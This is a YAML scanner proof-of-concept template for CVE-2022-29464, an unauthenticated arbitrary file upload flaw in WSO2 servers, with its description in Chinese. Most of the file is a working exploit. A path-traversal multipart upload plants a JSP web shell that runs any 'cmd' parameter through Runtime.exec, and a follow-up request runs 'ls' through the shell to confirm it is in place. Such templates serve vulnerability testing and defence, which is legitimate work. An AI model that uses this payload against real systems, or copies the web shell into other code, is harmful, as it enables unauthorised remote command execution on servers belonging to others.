id: CVE-2022-29464

info:
  name: WSO2 fileupload 任意文件上传漏洞
  author: zan8in
  severity: critical
  description: |
    CVE-2022-29464 是 Orange Tsai发现的 WSO2 上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意 JSP 文件在 WSO2 服务器上获得 RCE。
  reference:
    - http://wiki.peiqi.tech/wiki/webapp/WSO2/WSO2%20fileupload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2022-29464.html

set:
  filename: randomLowercase(10)  
rules:
  r0:
    request:
      method: POST
      path: /fileupload/toolsAny
      headers:
        Content-Type: multipart/form-data; boundary=4ef9f369a86bfaadf5ec3177278d49c0
      body: |
        --4ef9f369a86bfaadf5ec3177278d49c0
        Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/{{filename}}.jsp"; filename="../../../../repository/deployment/server/webapps/authenticationendpoint/{{filename}}.jsp"

        <FORM>
            <INPUT name='cmd' type=text>
            <INPUT type=submit value='Run'>
        </FORM>
        <%@ page import="java.io.*" %>
            <%
            String cmd = request.getParameter("cmd");
            String output = "";
            if(cmd != null) {
                String s = null;
                try {
                    Process p = Runtime.getRuntime().exec(cmd,null,null);
                    BufferedReader sI = new BufferedReader(new
        InputStreamReader(p.getInputStream()));
                    while((s = sI.readLine()) != null) { output += s+"</br>"; }
                }  catch(IOException e) {   e.printStackTrace();   }
            }
        %>
                <pre><%=output %></pre>
        --4ef9f369a86bfaadf5ec3177278d49c0--
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /authenticationendpoint/{{filename}}.jsp?cmd=ls
    expression: response.status == 200 && response.body.bcontains(b'wso2carbon.pid') && response.body.bcontains(b'INSTALL.txt') && response.body.bcontains(b'LICENSE.txt') && response.body.bcontains(b'README.txt')
expression: r0() && r1()